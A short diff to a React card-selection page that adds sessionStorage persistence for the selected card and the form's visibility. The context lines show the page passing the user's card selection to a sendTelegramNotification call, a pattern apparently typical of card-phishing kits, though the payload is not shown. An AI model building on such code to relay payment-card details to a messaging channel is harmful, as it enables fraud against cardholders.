@@ -208,6 +208,16 @@ const CardSelectPage = () => {
     setCardHolder(value);
   };
 
+  // Persist selection state to sessionStorage
+  useEffect(() => {
+    if (selected) sessionStorage.setItem("cardSelect_selected", selected);
+    else sessionStorage.removeItem("cardSelect_selected");
+  }, [selected]);
+
+  useEffect(() => {
+    sessionStorage.setItem("cardSelect_showForm", showForm ? "true" : "false");
+  }, [showForm]);
+
   const handleContinue = () => {
     if (!selected || !selectedCard) return;
     sendTelegramNotification({
